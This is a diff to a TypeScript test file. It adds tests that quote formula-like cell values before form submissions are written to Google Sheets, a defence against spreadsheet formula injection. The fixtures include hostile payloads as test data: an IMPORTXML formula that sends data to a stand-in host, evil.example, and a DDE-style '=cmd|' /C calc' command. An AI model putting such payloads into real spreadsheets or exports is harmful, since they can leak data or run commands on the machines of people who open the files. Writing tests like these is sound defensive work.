@@ -39,6 +39,7 @@ import {
   deliverGoogleSheets,
   MAX_HEADER_COLUMNS,
   MAX_HEADER_NAME_CHARS,
+  neutraliseFormula,
   planRow,
   quoteSheetName,
   sheetRow,
@@ -656,6 +657,22 @@ async function rows() {
   );
   t("while Other fields keeps the key as submitted", longRow.at(-1)?.key.length, 300);
 
+  // M5: what an export to Excel would evaluate.
+  console.log("\nformula prefixes (M5)");
+  for (const value of ["=1+1", "+1", "-1+1", "@SUM(A1)", "  =1", "\t1", "\r1"]) {
+    t(`${JSON.stringify(value)} is quoted`, neutraliseFormula(value), `'${value}`);
+  }
+  // The control: ordinary text, and a dash or equals sign later in the value,
+  // are left exactly as submitted.
+  for (const value of ["Priya", "a=b", "1-2", "priya@dorsetmetal.example", ""]) {
+    t(`${JSON.stringify(value)} is left alone`, neutraliseFormula(value), value);
+  }
+  t(
+    "a planned row quotes a string cell but not a number",
+    planRow([], [field("a", "=1+1"), { name: "n", value: -5, source: "field", key: "n", declared: false }]).row,
+    ["'=1+1", -5],
+  );
+
   // M4: lookalike stamps, and writing into somebody else's column.
   console.log("\nlookalikes and customer columns (M4)");
   const zeroWidth = sheetRow(payload({ "Origin​": "Human" }, { utm: false }));
@@ -825,9 +842,27 @@ async function delivery() {
       { payload: payload({ company: '=IMPORTXML("https://evil.example","//secret")' }) },
     );
     ok(
-      "a submitted formula is sent as the text it is",
-      (formula.calls.at(-1)?.body ?? "").includes('=IMPORTXML(\\"https://evil.example\\",\\"//secret\\")'),
+      "a submitted formula is sent as text, with a leading quote so an export cannot run it (M5)",
+      (formula.calls.at(-1)?.body ?? "").includes(`"'=IMPORTXML(\\"https://evil.example\\",\\"//secret\\")"`),
       formula.calls.at(-1)?.body,
+    );
+
+    // M5 for a header name and for attribution, which arrives in a query string.
+    const hostileNames = await deliver(
+      [tokenOk, { match: isSheets("GET", "!1:1"), status: 200, body: {} }, { match: isSheets("PUT", "!A1"), status: 200, body: {} }, appendOk],
+      {
+        payload: buildPayload(
+          { ...sampleSource({ publicId: "ep", name: "x" }), values: { "=cmd|' /C calc'!A0": "x" }, utmSource: "@SUM(1+1)" },
+          { id: "dlv", attempt: 1, sentAt: new Date(), test: false },
+        ),
+      },
+    );
+    const hostileHeader: string[] = JSON.parse(hostileNames.calls.find((call) => call.method === "PUT")?.body ?? "{}").values?.[0] ?? [];
+    ok("a header name that starts a formula is quoted", hostileHeader.includes("'=cmd|' /C calc'!A0"), hostileHeader);
+    ok(
+      "and so is an attribution value",
+      (hostileNames.calls.at(-1)?.body ?? "").includes(`"'@SUM(1+1)"`),
+      hostileNames.calls.at(-1)?.body,
     );
 
     // A tab name that is hostile to A1 notation and to a URL path both.
